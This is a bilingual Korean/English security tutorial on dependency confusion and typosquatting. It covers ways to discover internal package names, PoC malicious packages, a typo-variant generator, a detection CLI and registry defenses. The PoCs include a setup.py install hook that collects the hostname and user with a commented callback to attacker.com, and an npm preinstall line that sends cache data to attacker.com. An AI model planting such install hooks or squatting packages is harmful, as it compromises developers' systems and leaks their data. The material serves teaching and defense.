> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 의존성 혼동 공격 및 타이포스쿼팅

## 개요

2021년 Alex Birsan이 공개한 의존성 혼동(Dependency Confusion) 연구는 Apple, Microsoft, PayPal 등 35개 이상의 기업에서 RCE를 달성했다. 이 공격은 패키지 관리자가 내부 패키지보다 공개 레지스트리를 우선하는 버그를 악용한다.

---

## 의존성 혼동(Dependency Confusion) 공격 원리

### 배경

기업들은 내부용 패키지를 사설 레지스트리(Artifactory, AWS CodeArtifact 등)에 호스팅한다. 그런데 일부 패키지 관리자는 같은 이름의 패키지가 공개 레지스트리에 존재하면 더 높은 버전의 것을 자동으로 선택한다.

```
기업 내부:
  사설 레지스트리 → internal-utils v1.0.0

공격자:
  PyPI에 internal-utils v9999.0.0 등록

npm/pip/Maven이 패키지 설치 시:
  공개 레지스트리 v9999.0.0 > 사설 레지스트리 v1.0.0
  → 공격자 패키지 설치됨!
```

### 취약한 패키지 이름 탐색

```bash
# package.json, requirements.txt, pom.xml에서 내부 패키지 이름 발견
# 일반적으로 기업명이 접두사로 사용됨

# GitHub에서 기업 내부 패키지 이름 검색
# site:github.com COMPANY_NAME package.json "private"
# site:npm.js.org COMPANY_NAME (설치 이력이 있지만 실제 패키지가 없는 것)

# npm에서 특정 조직 스코프 확인
curl https://registry.npmjs.org/@company-name/

# PyPI에서 특정 패키지 존재 여부
pip index versions internal-package-name

# 잡히지 않은 내부 패키지 찾기
# JavaScript bundle 분석: sourceMap에 require('internal-pkg') 포함
# Docker 이미지 레이어 분석
# 에러 메시지에서 패키지명 노출 확인
```

---

## PyPI 의존성 혼동 공격 실습 (교육 목적)

### 악성 패키지 구조

```
evil-internal-pkg/
├── setup.py
├── evil_internal_pkg/
│   ├── __init__.py
│   └── payload.py
└── README.md
```

```python
# setup.py - 설치 시 자동 실행 (가장 위험)
from setuptools import setup
from setuptools.command.install import install
import subprocess
import socket
import os


class PostInstall(install):
    def run(self):
        install.run(self)
        # 패키지 설치 시 자동 실행되는 코드
        # 실제 공격에서는 리버스 셸, 정보 탈취 등
        hostname = socket.gethostname()
        username = os.getenv("USER", "unknown")
        # 탐지 콜백 (Alex Birsan의 연구 방식)
        # requests.post("http://attacker.com/callback",
        #     json={"host": hostname, "user": username})
        print(f"[*] 의존성 혼동 PoC — 설치됨: {hostname}/{username}")


setup(
    name="target-internal-package",  # 기업 내부 패키지명과 동일하게
    version="9999.0.0",  # 버전을 매우 높게 설정
    author="Dependency Confusion PoC",
    description="Security Research Package",
    long_description="This package is for security research purposes.",
    cmdclass={"install": PostInstall},
    packages=["target_internal_package"],
)
```

```python
# __init__.py - 임포트 시 실행
import socket
import os

def _beacon():
    try:
        hostname = socket.gethostname()
        user = os.getenv("USER", "unknown")
        # 연구 목적: 설치된 환경 기록
        print(f"[INFO] Package loaded on {hostname} by {user}")
    except Exception:
        pass

_beacon()
```

---

## npm 의존성 혼동

```javascript
// package.json - postinstall 스크립트
{
  "name": "company-internal-lib",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://attacker.com/?' + process.env.npm_config_cache)\"",
    "postinstall": "node postinstall.js"
  }
}
```

```javascript
// postinstall.js
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

// 설치 환경 정보 수집
const info = {
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd(),
};

console.log('[*] Dependency Confusion PoC installed:', JSON.stringify(info));
```

---

## 타이포스쿼팅(Typosquatting)

의존성 혼동과 달리, 타이포스쿼팅은 인기 패키지의 이름과 유사한 이름으로 사용자가 오타를 입력할 때를 노린다.

### 유명 패키지 타이포스쿼팅 예시

| 실제 패키지 | 타이포스쿼팅 변형 |
|-------------|-------------------|
| `requests` | `reqeusts`, `request`, `requets` |
| `numpy` | `nunpy`, `nupmy`, `numapy` |
| `urllib3` | `urliib3`, `urlib3` |
| `boto3` | `bot03`, `boto-3` |
| `django` | `dajngo`, `djano` |

### 타이포스쿼팅 패턴

```python
def generate_typos(package_name: str) -> list[str]:
    """패키지명 타이포스쿼팅 변형 생성"""
    typos: set[str] = set()
    name = package_name

    # 문자 제거
    for i in range(len(name)):
        typos.add(name[:i] + name[i+1:])

    # 인접 문자 교환
    for i in range(len(name) - 1):
        swapped = list(name)
        swapped[i], swapped[i+1] = swapped[i+1], swapped[i]
        typos.add("".join(swapped))

    # 문자 삽입 (인근 키)
    keyboard_neighbors = {
        "a": "sqwz", "b": "vghn", "c": "xdfv",
        "d": "sfecxr", "e": "wrsdf", "f": "drtgvc",
        # ... (생략)
    }
    for i, char in enumerate(name):
        if char in keyboard_neighbors:
            for neighbor in keyboard_neighbors[char]:
                typos.add(name[:i] + neighbor + name[i:])

    # 하이픈/언더스코어 변형
    typos.add(name.replace("-", "_"))
    typos.add(name.replace("_", "-"))
    typos.add(name.replace("-", ""))
    typos.add(name.replace("_", ""))

    return [t for t in typos if t != name and len(t) > 0]
```

---

## Python: 패키지명 유사도 검사 도구

```python
#!/usr/bin/env python3
"""
Package Name Similarity Checker - 타이포스쿼팅/의존성 혼동 탐지
사용법: python3 pkg_checker.py --packages requests numpy django
        python3 pkg_checker.py --requirements requirements.txt --ecosystem pypi
"""

import argparse
import difflib
import json
import sys
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class PackageCheckResult:
    package_name: str
    exists_on_public: bool = False
    latest_version: str = ""
    similar_packages: list[str] = field(default_factory=list)
    risk: str = "LOW"


def check_pypi_exists(package_name: str) -> tuple[bool, str]:
    url = f"https://pypi.org/pypi/{package_name}/json"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = json.loads(resp.read())
            version = data.get("info", {}).get("version", "")
            return True, version
    except Exception:
        return False, ""


def check_npm_exists(package_name: str) -> tuple[bool, str]:
    url = f"https://registry.npmjs.org/{package_name}/latest"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = json.loads(resp.read())
            return True, data.get("version", "")
    except Exception:
        return False, ""


def get_pypi_top_packages(limit: int = 500) -> list[str]:
    """PyPI 상위 패키지 목록 가져오기"""
    # PyPI stats API
    url = "https://pypi.org/simple/"
    try:
        req = urllib.request.Request(
            url, headers={"Accept": "application/vnd.pypi.simple.v1+json"}
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
            projects = data.get("projects", [])
            return [p["name"] for p in projects[:limit]]
    except Exception:
        # fallback: 잘 알려진 패키지 목록
        return [
            "requests", "numpy", "pandas", "scipy", "matplotlib",
            "django", "flask", "fastapi", "sqlalchemy", "celery",
            "boto3", "pytest", "setuptools", "pip", "wheel",
            "cryptography", "paramiko", "pyyaml", "click", "rich",
        ]


def find_similar_packages(
    package_name: str,
    known_packages: list[str],
    threshold: float = 0.85,
) -> list[str]:
    """유사한 패키지 이름 찾기"""
    similar = []
    for pkg in known_packages:
        if pkg == package_name:
            continue
        ratio = difflib.SequenceMatcher(None, package_name.lower(), pkg.lower()).ratio()
        if ratio >= threshold:
            similar.append(f"{pkg} (유사도: {ratio:.0%})")
    return similar


def check_dependency_confusion_risk(
    package_name: str,
    ecosystem: str = "pypi",
) -> PackageCheckResult:
    result = PackageCheckResult(package_name=package_name)

    if ecosystem == "pypi":
        result.exists_on_public, result.latest_version = check_pypi_exists(package_name)
    elif ecosystem == "npm":
        result.exists_on_public, result.latest_version = check_npm_exists(package_name)

    if not result.exists_on_public:
        result.risk = "HIGH"  # 공개 레지스트리에 없으면 등록하면 공격 가능

    return result


def parse_requirements(filepath: Path) -> list[str]:
    packages = []
    for line in filepath.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # "package==1.0.0" → "package"
        pkg = line.split("==")[0].split(">=")[0].split("<=")[0].split("~=")[0].strip()
        if pkg:
            packages.append(pkg)
    return packages


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Package Security Checker - 타이포스쿼팅/의존성 혼동 탐지",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python3 pkg_checker.py --packages requests numpy
  python3 pkg_checker.py --requirements requirements.txt
  python3 pkg_checker.py --requirements package.json --ecosystem npm
        """,
    )
    parser.add_argument("--packages", nargs="+", help="검사할 패키지 이름 목록")
    parser.add_argument("--requirements", type=Path, help="requirements.txt 경로")
    parser.add_argument("--ecosystem", choices=["pypi", "npm"], default="pypi")
    parser.add_argument("--workers", type=int, default=10, help="병렬 작업 수")
    parser.add_argument("--threshold", type=float, default=0.85,
                        help="유사도 임계값 (0~1, 기본 0.85)")

    args = parser.parse_args()

    packages: list[str] = []
    if args.packages:
        packages = args.packages
    elif args.requirements:
        packages = parse_requirements(args.requirements)
    else:
        parser.print_help()
        sys.exit(1)

    print(f"[*] {len(packages)}개 패키지 검사 중 ({args.ecosystem})...")

    results: list[PackageCheckResult] = []
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(check_dependency_confusion_risk, pkg, args.ecosystem): pkg
            for pkg in packages
        }
        for future in as_completed(futures):
            result = future.result()
            results.append(result)

    # 상위 패키지 목록으로 타이포스쿼팅 검사
    print("[*] 타이포스쿼팅 유사도 검사...")
    known = get_pypi_top_packages(200)
    for result in results:
        result.similar_packages = find_similar_packages(
            result.package_name, known, args.threshold
        )

    # 결과 출력
    high_risk = [r for r in results if r.risk == "HIGH"]
    medium_risk = [r for r in results if r.similar_packages]

    print(f"\n{'='*60}")
    print(f"검사 결과: {len(results)}개 패키지")
    print(f"{'='*60}")

    if high_risk:
        print(f"\n🔴 의존성 혼동 위험 ({len(high_risk)}개):")
        for r in high_risk:
            print(f"  {r.package_name} — 공개 레지스트리에 없음 (공격자가 등록 가능)")

    if medium_risk:
        print(f"\n🟡 타이포스쿼팅 의심 ({len(medium_risk)}개):")
        for r in medium_risk:
            print(f"  {r.package_name}:")
            for similar in r.similar_packages[:3]:
                print(f"    → {similar}")

    if not high_risk and not medium_risk:
        print("\n✅ 위험 패키지 미발견")

    sys.exit(1 if high_risk else 0)


if __name__ == "__main__":
    main()
```

---

## 방어 방법

### 사설 레지스트리 우선 설정

```bash
# pip: 사설 레지스트리만 사용
pip config set global.index-url https://artifactory.company.com/api/pypi/pypi/simple
pip config set global.extra-index-url ""  # 공개 레지스트리 비활성화

# pip.conf 설정
cat > ~/.pip/pip.conf << 'EOF'
[global]
index-url = https://artifactory.company.com/api/pypi/pypi/simple
no-index = true  # 공개 레지스트리 완전 차단
EOF

# npm: 스코프별 레지스트리 설정
npm config set @company:registry https://artifactory.company.com/api/npm/npm/
# 공개 레지스트리도 허용하되, 스코프 패키지는 사설로
```

### 내부 패키지명 공개 레지스트리 예약

```bash
# 예방: 내부에서 사용하는 패키지명을 공개 레지스트리에 미리 등록 (빈 패키지로)
# PyPI에 더미 패키지 등록하여 공격자가 등록 못하게 방지

# 또는 고유한 스코프 사용 (npm)
# @mycompany/internal-package  (스코프가 있으면 혼동 공격 어려움)
```

| 방어 기법 | 적용 방법 |
|-----------|-----------|
| 사설 레지스트리 격리 | 공개 레지스트리 접근 차단, 사설만 허용 |
| 패키지 이름 예약 | 내부 패키지명을 공개 레지스트리에 더미로 등록 |
| 고유 네임스페이스 | npm @scope/, Python: 회사명 접두사 |
| 해시 고정(pinning) | requirements.txt에 해시 명시 |
| 의존성 감사 | pip-audit, npm audit 정기 실행 |
| CI/CD 검증 | SBOM 생성 및 허용 목록 비교 |

---

<a name="english"></a>

# Dependency Confusion Attacks and Typosquatting

## Overview

Alex Birsan's 2021 dependency confusion research achieved RCE at over 35 companies including Apple, Microsoft, and PayPal. This attack exploits a bug in package managers that prioritize public registries over internal ones when a package with the same name exists in both.

---

## Dependency Confusion Attack Principle

### Background

Companies host internal packages in private registries (Artifactory, AWS CodeArtifact, etc.). However, some package managers automatically select the higher version — so if an attacker publishes a package with the same name and a very high version number to a public registry, the package manager will install the attacker's package instead.

```
Corporate Internal:
  Private registry → internal-utils v1.0.0

Attacker:
  Registers internal-utils v9999.0.0 on PyPI

When npm/pip/Maven installs packages:
  Public registry v9999.0.0 > Private registry v1.0.0
  → Attacker's package gets installed!
```

### Discovering Vulnerable Package Names

Search techniques include:
- Examining `package.json`, `requirements.txt`, `pom.xml` in public GitHub repositories
- Checking npm for organization-scoped packages that don't exist publicly
- Checking PyPI for package names that appear in bundles but aren't registered
- Analyzing Docker image layers and error messages for internal package names

---

## PyPI Dependency Confusion Attack (Educational)

### Malicious Package Structure

The attack uses `setup.py` `cmdclass` hooks or npm `postinstall` scripts to execute code at install time. See Korean section for full code examples.

Key elements:
- **Package name**: matches the internal package name exactly
- **Version**: set extremely high (e.g., `9999.0.0`) to win version resolution
- **Install hook**: executes a callback/beacon to confirm successful installation

---

## npm Dependency Confusion

npm `preinstall`/`postinstall` scripts run automatically during `npm install`, making them ideal injection points. Use `--ignore-scripts` flag to prevent this.

---

## Typosquatting

Unlike dependency confusion, typosquatting targets users who make typos when manually installing packages.

### Common Typosquatting Examples

| Real Package | Typosquatting Variants |
|--------------|------------------------|
| `requests` | `reqeusts`, `request`, `requets` |
| `numpy` | `nunpy`, `nupmy`, `numapy` |
| `urllib3` | `urliib3`, `urlib3` |
| `boto3` | `bot03`, `boto-3` |
| `django` | `dajngo`, `djano` |

### Typosquatting Pattern Generation

Common transformation patterns:
- Character deletion
- Adjacent character swap
- Keyboard-neighbor character insertion
- Hyphen/underscore substitution

See Korean section for the Python `generate_typos()` implementation.

---

## Python: Package Name Similarity Checker

A CLI tool for detecting typosquatting and dependency confusion risks in your dependency lists. See Korean section for full code.

Key features:
- Checks whether each package exists on PyPI or npm
- Packages not found on public registries are flagged as HIGH risk (attackers could register them)
- Computes string similarity to known popular packages to detect typosquatting

---

## Defense Methods

### Private Registry Isolation

```bash
# pip: use only the private registry
pip config set global.index-url https://artifactory.company.com/api/pypi/pypi/simple
pip config set global.extra-index-url ""  # disable public registry

# npm: scope-based registry routing
npm config set @company:registry https://artifactory.company.com/api/npm/npm/
```

### Reserve Internal Package Names on Public Registries

Pre-register internal package names on PyPI/npm as empty/dummy packages to prevent attackers from claiming them.

| Defense Technique | Implementation |
|-------------------|----------------|
| Private registry isolation | Block public registry access, allow only private |
| Package name reservation | Register internal names on public registries as dummies |
| Unique namespaces | Use npm `@scope/`, Python company-name prefix |
| Hash pinning | Specify hashes in `requirements.txt` |
| Dependency auditing | Run `pip-audit`, `npm audit` regularly |
| CI/CD verification | Generate SBOM and compare against allowlist |
